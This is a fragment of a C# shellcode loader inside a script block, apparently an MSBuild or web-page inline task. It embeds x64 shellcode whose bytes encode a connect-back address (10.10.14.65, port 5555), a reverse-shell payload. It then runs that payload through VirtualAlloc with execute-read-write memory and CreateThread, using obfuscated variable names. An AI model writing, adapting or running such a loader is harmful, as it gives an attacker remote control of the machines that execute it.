...
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x15,0xb3,0x0a,0x0a,0x0e,0x41,
...
0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
        ...
        IntPtr sxR7H = VirtualAlloc(IntPtr.Zero,(UIntPtr)iDkOPgRg.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(iDkOPgRg,0,sxR7H,iDkOPgRg.Length);
        IntPtr fYHG5vYZ0 = IntPtr.Zero;
        IntPtr cNDWS = CreateThread(IntPtr.Zero,UIntPtr.Zero,sxR7H,IntPtr.Zero,0,ref fYHG5vYZ0);
    }
</script>
